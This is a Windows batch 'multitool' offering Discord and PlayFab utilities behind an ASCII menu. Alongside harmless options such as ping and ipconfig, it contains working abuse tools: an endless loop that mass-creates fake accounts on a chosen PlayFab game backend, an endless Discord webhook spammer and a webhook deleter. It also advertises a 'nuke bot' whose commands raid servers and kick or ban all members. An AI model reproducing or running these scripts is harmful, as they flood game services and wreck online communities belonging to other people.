@echo off
mode 185, 50
color 1
chcp 65001 >nul
title Drpeppers Multitool
goto banner
color 0A


:banner
cls
echo.
echo.
echo.
echo 		██████╗ ██████╗ ██████╗      ███╗   ███╗██╗   ██╗██╗  ████████╗██╗   ████████╗ ██████╗  ██████╗ ██╗
echo 		██╔══██╗██╔══██╗██╔══██╗     ████╗ ████║██║   ██║██║  ╚══██╔══╝██║   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo 		██║  ██║██████╔╝██████╔╝     ██╔████╔██║██║   ██║██║     ██║   ██║█████╗██║   ██║   ██║██║   ██║██║     
echo 		██║  ██║██╔══██╗██╔═══╝      ██║╚██╔╝██║██║   ██║██║     ██║   ██║╚════╝██║   ██║   ██║██║   ██║██║     
echo 		██████╔╝██║  ██║██║          ██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗
echo 		╚═════╝ ╚═╝  ╚═╝╚═╝          ╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo  IF THIS LOOKS WEIRD, GO TO CMD AS ADMIN, RIGHT CLICK THE TITLE, CLICK DEFAULTS, GO TO "TERMINAL", THEN AT "DEFAULT TERMINAL APP..", MAKE IT WCH.
echo.
echo.
echo 			════════════════════════════════════════════════════════════════════════════════════════════════════
echo.
echo                                           1) IP CONFIG                 4) JOIN THE DISCORD!
echo                                           2) OPEN NOTEPAD              5) INVITE THE NUKE BOT!
echo                                           3) PING A WEBSITE/IP         6) EXIT :(
echo 					  7) spam a playfab	       8) create your own personal playfab BOT
echo				  	  	  9) spam a webhook	       10) check if a webhook is valid or not
echo					  	  11) delete a webhook	       12) send a webhook message
echo 					  13) get webhook info	       14) ip lookup
echo.
echo 			════════════════════════════════════════════════════════════════════════════════════════════════════

set /p choice=					Choose an option (1-14): 

if "%choice%"=="1" goto ipconfig
if "%choice%"=="2" goto notepad
if "%choice%"=="6" goto exit
if "%choice%"=="3" goto pingcustom
if "%choice%"=="4" goto joindiscord
if "%choice%"=="5" goto invitebot
if "%choice%"=="0" goto special
if "%choice%"=="7" goto spam 
if "%choice%"=="8" goto playfab
if "%choice%"=="9" goto webhook
if "%choice%"=="10" goto webhookcheck
if "%choice%"=="11" goto webhookdelete
if "%choice%"=="12" goto webhooksend
if "%choice%"=="13" goto webhookinfo
if "%choice%"=="14" goto iplookup
if "%choice%"=="15" goto discordserver

goto banner

:ipconfig
cls
echo Running IP Configuration...
echo --------------------------------------------
ipconfig
pause
goto banner

:notepad
cls
echo Opening Notepad...
start notepad
pause
goto banner

:pingcustom
cls
set /p target=Enter IP address or website to ping: 
set /p count=How many times would you like to ping it? 
echo.
echo Pinging %target% %count% times...
ping %target% -n %count%
pause
goto banner

:joindiscord
cls
echo Opening Discord invite in your browser...
start https://discord.gg/t3rquXvPMg
pause
goto banner

:invitebot
cls
start https://discord.com/oauth2/authorize?client_id=1356477205106130964 
echo.
echo Opening invite link...
start %botlink%
echo.
echo ================= Bot Commands =================
echo $nuke        - Basic command nukes the server
echo $raid        - pings 1k times in the channel its used in
echo $kickall    - kicks all members
echo $kickbots   - kick all bots in server
echo $banall   - Ban all members
echo ===============================================
pause
goto banner

:special
cls
start "" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
echo.
echo.
echo.
echo.
echo.
echo ===================================
echo Goose Was Here Love ya DRP ^<3
echo ===================================
pause
goto banner

:spam 
cls 
@echo off
setlocal enabledelayedexpansion

set /p TITLEID="Title ID: "

:loop
for /f "delims=" %%i in ('powershell -command "[guid]::NewGuid().ToString()"') do set DEVICEID=%%i

curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithAndroidDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"AndroidDeviceId\":\"%DEVICEID%\",\"CreateAccount\":true}"
curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithNintendoSwitchDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"NintendoSwitchDeviceId\":\"dfgl\",\"CreateAccount\":true}"
curl -X POST "https://%TITLEID%.playfabapi.com/Client/LoginWithIOSDeviceID" -H "Content-Type: application/json" -d "{\"TitleId\":\"%TITLEID%\",\"DeviceId\":\"fhdg\",\"CreateAccount\":true}"

echo Sent requests with ID: %DEVICEID%
goto loop
pause 
goto banner

:playfab

@echo off
setlocal EnableDelayedExpansion

cls
set /p title_id="title_id: "
set /p secret_key="SecretKey: "
set /p guild_id="guild id: "
set /p bot_token="bot token: "

>playfabbot.py (
echo import discord
echo from discord import app_commands
echo from discord.ext import commands, tasks
echo import json
echo import aiohttp
echo from aiohttp import ClientSession
echo import os
echo from datetime import datetime, timedelta
echo from discord.ext.commands import has_permissions
echo import requests
echo from datetime import datetime
echo.
echo intents = discord.Intents.default(^)
echo intents.message_content = True
echo intents.presences = True
echo intents.members = True
echo.
echo bot = commands.Bot(command_prefix='-', intents=intents^)
echo title_id = "!title_id!"
echo.
echo secret_key = "!secret_key!"
echo.
echo ALLOWED_GUILD = !guild_id!
echo.
echo @bot.event
echo async def on_guild_join(guild^):
echo     if guild.id not in ALLOWED_GUILD:
echo         await guild.leave(^)
echo.
echo async def verify_playfab_credentials(title_id, secret_key^):
echo     headers = {"X-SecretKey": secret_key, "Content-Type": "application/json"}
echo     url = f"https://{title_id}.playfabapi.com/Admin/GetPlayerProfile"
echo     async with aiohttp.ClientSession(^) as session:
echo         async with session.post(url, json={"PlayFabId": "Test"}, headers=headers^) as resp:
echo             if resp.status == 401:
echo                 return False
echo             return True
echo.
echo async def playfab_post(endpoint: str, data: dict^):
echo     headers = {
echo         "Content-Type": "application/json",
echo         "X-SecretKey": secret_key
echo     }
echo     async with ClientSession(^) as session:
echo         async with session.post(f"https://{title_id}.playfabapi.com/{endpoint}", json=data, headers=headers^) as response:
echo             return await response.json(^)
echo.
echo async def playfab_request(user_id, endpoint, payload^):
echo     headers = {"X-SecretKey": secret_key, "Content-Type": "application/json"}
echo     url = f"https://{title_id}.playfabapi.com/{endpoint}"
echo     async with aiohttp.ClientSession(^) as session:
echo         async with session.post(url, json=payload, headers=headers^) as resp:
echo             return await resp.json(^), None
echo.
echo @bot.event
echo async def on_ready(^):
echo     print(f"Logged in as {bot.user}"^)
echo     try:
echo         synced = await bot.tree.sync(^)
echo         print(f"Synced {len(synced)} slash commands."^)
echo     except Exception as e:
echo         print(f"Error syncing commands: {e}"^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def ban(ctx, player_id: str, reason: str, length: int^):
echo     payload = {
echo         "Bans": [{
echo             "DurationInHours": length,
echo             "Reason": reason,
echo             "PlayFabId": player_id
echo         }]
echo     }
echo     data, error = await playfab_request(ctx.author.id, "Admin/BanUsers", payload^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Player Banned", color=discord.Color.red(^)^)
echo     embed.add_field(name="Player ID", value=f"```{player_id}```", inline=False^)
echo     embed.add_field(name="Reason", value=f"```{reason}```", inline=False^)
echo     embed.add_field(name="Ban Duration", value=f"```{length} hours```", inline=False^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="ban", description="Ban a player."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def ban_slash(interaction: discord.Interaction, player_id: str, duration: int, reason: str^):
echo     if duration ^<= 0:
echo         embed = discord.Embed(title="Invalid Duration", description="The ban duration must be at least 1 hour.", color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     ban_until = (datetime.utcnow(^) + timedelta(hours=duration^)^).strftime("%%Y-%%m-%%dT%%H:%%M:%%SZ"^)
echo     payload = {
echo         "Bans": [{
echo             "PlayFabId": player_id,
echo             "Reason": reason,
echo             "EndDate": ban_until,
echo             "Permanent": False
echo         }]
echo     }
echo     data, error = await playfab_request(interaction.user.id, "Admin/BanUsers", payload^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Player Banned", color=discord.Color.red(^)^)
echo     embed.add_field(name="Player ID", value=f"```{player_id}```", inline=False^)
echo     embed.add_field(name="Reason", value=f"```{reason}```", inline=False^)
echo     embed.add_field(name="Ban Duration", value=f"```{duration} hours```", inline=False^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def unban(ctx, player_id: str^):
echo     data, error = await playfab_request(ctx.author.id, "Admin/RevokeAllBansForUser", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Unban Successful", description=f"Player {player_id} has been unbanned.", color=discord.Color.green(^)^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="unban", description="Unban a player."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def unban_slash(interaction: discord.Interaction, player_id: str^):
echo     data, error = await playfab_request(interaction.user.id, "Admin/RevokeAllBansForUser", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Unban Successful", description=f"Player {player_id} has been unbanned.", color=discord.Color.green(^)^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo @bot.command(^)
echo @has_permissions(moderate_members=True^)
echo async def datawipe(ctx, player_id: str^):
echo     data, error = await playfab_request(ctx.author.id, "Admin/DeletePlayer", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await ctx.send(embed=embed^)
echo         return
echo     embed = discord.Embed(title="Data Wiped", description=f"Player {player_id}'s data has been wiped.", color=discord.Color.purple(^)^)
echo     await ctx.send(embed=embed^)
echo.
echo @bot.tree.command(name="datawipe", description="Wipe a player's data."^)
echo @app_commands.checks.has_permissions(moderate_members=True^)
echo async def datawipe_slash(interaction: discord.Interaction, player_id: str^):
echo     data, error = await playfab_request(interaction.user.id, "Admin/DeletePlayer", {"PlayFabId": player_id}^)
echo     if error:
echo         embed = discord.Embed(title="Error", description=error, color=discord.Color.red(^)^)
echo         await interaction.response.send_message(embed=embed, ephemeral=True^)
echo         return
echo     embed = discord.Embed(title="Data Wiped", description=f"Player {player_id}'s data has been wiped.", color=discord.Color.purple(^)^)
echo     await interaction.response.send_message(embed=embed^)
echo.
echo bot.run("!bot_token!"^)
)

echo Python file has been generated as 'playfabbot.py'
pause
goto banner

:webhook
cls
@echo off                                                                                                  
set /p webhook="Add the webhook to spam: "
set /p message="Add the message to spam: "
goto no_delay_spam

:no_delay_spam
curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"%message%\"}" %webhook%
echo Message sent (to stop close tab)
goto no_delay_spam

:webhookcheck
cls
@echo off
setlocal EnableDelayedExpansion


set /p webhook= "webhook to check: "

echo Checking webhook validity...
curl -s -o nul -w "%%{http_code}" "%webhook%" > temp.txt
set /p status=<temp.txt
del temp.txt

if "%status%"=="200" (
    echo [SUCCESS] Webhook is valid!
) else (
    echo [ERROR] Invalid webhook! Status code: %status%
)

pause
goto banner

:webhookdelete
cls
@echo off
setlocal EnableDelayedExpansion

set /p webhook="webhook to delete: "

echo Attempting to delete webhook...
curl -X DELETE "%webhook%"

if %errorlevel% equ 0 (
    echo Webhook deleted successfully!
) else (
    echo Failed to delete webhook.
)

pause
goto banner

:webhooksend

@echo off
cls
set /p webhook=Webhook : 
set /p message=Message : 
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
pause
goto banner
:webhookinfo
@echo off
cls
setlocal
set /p WEBHOOK_URL="webhook url: "
curl -s -X GET %WEBHOOK_URL%
endlocal
pause
goto banner

:iplookup
@echo off
cls
set /p ip=Enter IP address to look up: 
echo Looking up IP address...
curl -s http://ip-api.com/json/%ip% > "%temp%\iplookup.json"


echo ----------------------------------------
type "%temp%\iplookup.json"
echo ----------------------------------------

pause
goto banner

:discordserver
@echo off
cls
setlocal
set /p token=Enter your Discord bot token: 
set "pyfile=__temp_dsinfo.py"
set "outputfile=%~f0"  :: This batch file

(
echo import discord
echo import asyncio
echo from discord.ext import commands
echo. 
echo intents = discord.Intents.default()
echo intents.members = True
echo bot = commands.Bot(command_prefix="!", intents=intents)
echo.
echo @bot.event
echo async def on_ready():
echo     with open(r"%outputfile%", "a", encoding="utf-8") as f:
echo         f.write("\n:: ========== Discord Server Info ==========\n")
echo         for guild in bot.guilds:
echo             f.write(f":: Server Name: {guild.name}\n")
echo             f.write(f":: Server ID: {guild.id}\n")
echo             f.write(f":: Owner: {guild.owner}\n")
echo             f.write(f":: Member Count: {guild.member_count}\n")
echo             f.write(":: -----------------------------\n")
echo     await bot.close()
echo.
echo bot.run("%token%")
) > %pyfile%


python %pyfile%


del %pyfile%

echo Server info has been added to this .bat file as comments.
pause
goto banner

:exit
cls
echo Thank you for using Drpeppers multitool!
timeout /t 2 >nul
exit